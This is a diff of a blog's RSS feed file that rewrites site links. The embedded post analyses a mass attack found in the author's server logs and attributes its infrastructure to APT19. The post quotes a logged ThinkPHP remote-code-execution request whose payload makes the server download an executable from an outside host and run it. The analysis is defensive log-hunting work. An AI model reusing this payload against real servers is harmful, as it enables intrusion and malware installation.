@@ -10,7 +10,7 @@
 <channel>
 	<title>Web &#8211; ~# Hackonch !</title>
 	<atom:link href="https://hackonch.ml/category/web/feed/" rel="self" type="application/rss+xml" />
-	<link>https://hackonch.ml</link>
+	<link>https://tchernobylus.altervista.org</link>
 	<description>Security rhymes with Liberty</description>
 	<lastBuildDate>Mon, 19 Aug 2019 17:46:17 +0000</lastBuildDate>
 	<language>en-US</language>
@@ -23,7 +23,7 @@
 <image>
 	<url>https://hackonch.ml/wp-content/uploads/2019/08/f56f9-favicon-1-150x150.png</url>
 	<title>Web &#8211; ~# Hackonch !</title>
-	<link>https://hackonch.ml</link>
+	<link>https://tchernobylus.altervista.org</link>
 	<width>32</width>
 	<height>32</height>
 </image> 
@@ -37,10 +37,10 @@
 		<category><![CDATA[Malware-Hunting]]></category>
 		<category><![CDATA[Web]]></category>
 
-		<guid isPermaLink="false">https://hackonch.ml/?p=796</guid>
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=796</guid>
 				<description><![CDATA[<div class="post-excerpt">Hi everyone ! As you may know, I&#8217;m not joking with cybersecurity. Which means I&#8217;m not joking with the blog. That being said, a good way to ensure the safety&#8230;</div>
 <div class="post-more"><a href="https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/" class="btn btn-primary btn-effect btn-lg"><span>View Post</span><span><i class="icon icon-arrow-right"></i></span></a></div>
-<p>The post <a rel="nofollow" href="https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/">Analysis of a Chinese Mass Attack (ft. Codoso Team)</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/">Analysis of a Chinese Mass Attack (ft. Codoso Team)</a> appeared first on <a rel="nofollow" href="https://tchernobylus.altervista.org">~# Hackonch !</a>.</p>
 ]]></description>
 								<content:encoded><![CDATA[<p>Hi everyone !</p>
 <p>As you may know, I&#8217;m not joking with cybersecurity. Which means I&#8217;m not joking with the blog. That being said, a good way to ensure the safety of its own equipment is to periodically peel the log files.</p>
@@ -48,7 +48,7 @@
 <p>A few days ago, I noticed that more than 50% of http requests received to my website are not actually visitors but hosts targeting the entire internet for vulnerable servers. This is called &#8220;mass attacks&#8221;.</p>
 <p>Even if they could be impressive, these mass attacks are very unsophisticated and good practices are generally more than enough to make it meaningless.</p>
 <p>However, there was this request, punctual, and quite sophisticated:</p>
-<pre> 124.161.103.251 - - [02 /Apr /2019: 17: 17: 41 +0200] "GET /public/index.php?s=index/thinkx5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp ; vars [1] [] = cmd.exe% 20 /c% 20powershell% 20 (new-object 20System.Net.WebClient%).DownloadFile ( 'http://fid.hognoob.se/download.exe', ' C: /Windows/temp/fbouucstzfhszdw10280.exe '); start% 20C: /Windows/temp/fbouucstzfhszdw10280.exe HTTP /1.1 "301 5" http://hackonch.ml/public/index.php?s= index /thinkx5Capp /invokefunction & function = call_user_func_array & vars [0] = system & vars [1] [] = cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile ('http: //fid. hognoob.se/download.exe','C:/Windows/temp/fbouucstzfhszdw10280.exe');start C: /Windows/temp/fbouucstzfhszdw10280.exe "" Mozilla /4.0 (compatible; MSIE 9.0; Windows NT 6.1) "<br />
+<pre> 124.161.103.251 - - [02 /Apr /2019: 17: 17: 41 +0200] "GET /public/index.php?s=index/thinkx5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp ; vars [1] [] = cmd.exe% 20 /c% 20powershell% 20 (new-object 20System.Net.WebClient%).DownloadFile ( 'http://fid.hognoob.se/download.exe', ' C: /Windows/temp/fbouucstzfhszdw10280.exe '); start% 20C: /Windows/temp/fbouucstzfhszdw10280.exe HTTP /1.1 "301 5" http://blog.tchernobyl.ml/public/index.php?s= index /thinkx5Capp /invokefunction & function = call_user_func_array & vars [0] = system & vars [1] [] = cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile ('http: //fid. hognoob.se/download.exe','C:/Windows/temp/fbouucstzfhszdw10280.exe');start C: /Windows/temp/fbouucstzfhszdw10280.exe "" Mozilla /4.0 (compatible; MSIE 9.0; Windows NT 6.1) "<br />
 </Pre></p>
 <p>To make it simple, this request attempts to execute a powershell command through "index.php". If the server is vulnerable, a file is downloaded, executed in memory and then deleted from disk to cover up traces.</p>
 <p>After some verifications, it would be proof of concept on a "ThinkPHP" vulnerability. It's a PHP-based web application development framework distributed under the open source Apache2 license. This framework is very popular in China, where more than 40,000 servers are running ThinkPHP (<a href = "https://securitynews.sonicwall.com/xmlpost/thinkphp-remote-code-execution-rce-bug-is-actively-being -exploited /"rel="noopener noreferrer"target =" _ blank "> source </a>)</p>
@@ -80,10 +80,10 @@ http://2019.ip138.com/ic.asp 117.25.157.119 ----> Control and Command (SERVER D)
 <h3> Verdict </h3>
 <p>Although nothing allows us to say that this is an attack orchestrated by Russian hackers, it is obvious that most of the operation infrastructure is located in Russia.</p>
 <p>The fact that the biggest benefit of the operation is in China and the coincidence to have a vital server to the operation being also located in China is a bit intriguing.</p>
-<p>Even more intriguing is the fact that the domain used for the C&C would be attributed to <a href="https://attack.mitre.org/groups/G0073/"> APT 19 </a>. Also known as the sweet name of "Codoso Team" or "Sunshop Group". It would be a group of independent hackers who would benefit from some form of support from the Chinese government (<a href = "https://www.fireeye.fr/current-threats/apt-groups.html # apt19 "></a> source)</p>
+<p>Even more intriguing is the fact that the domain used for the C&C would be attributed to <a href="https://attack.mitre.org/groups/G0073/"> APT 19 </a>. Also known as the sweet name of "Codoso Team" or "Sunshop Group". It would be a group of independent hackers who would benefit from some form of support from the Chinese government (<a href = "https://www.fireeye.fr/current-threats/apt-groups.html # apt19 "> </a> source)</p>
 <p>In short, this is where my little investigations led me to learn a little more about these hackers of the shadows who are so well-known and so unknown at the same time.</p>
 <p>I hope you liked this article, feel free to send me messages via the contact form or even in comments to give me your point of view,or if you knew the same situation / a similar situation, I read them all! 🤠</p>
-<p>The post <a rel="nofollow" href="https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/">Analysis of a Chinese Mass Attack (ft. Codoso Team)</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/">Analysis of a Chinese Mass Attack (ft. Codoso Team)</a> appeared first on <a rel="nofollow" href="https://tchernobylus.altervista.org">~# Hackonch !</a>.</p>
 ]]></content:encoded>
 							<wfw:commentRss>https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/feed/</wfw:commentRss>
 		<slash:comments>0</slash:comments>
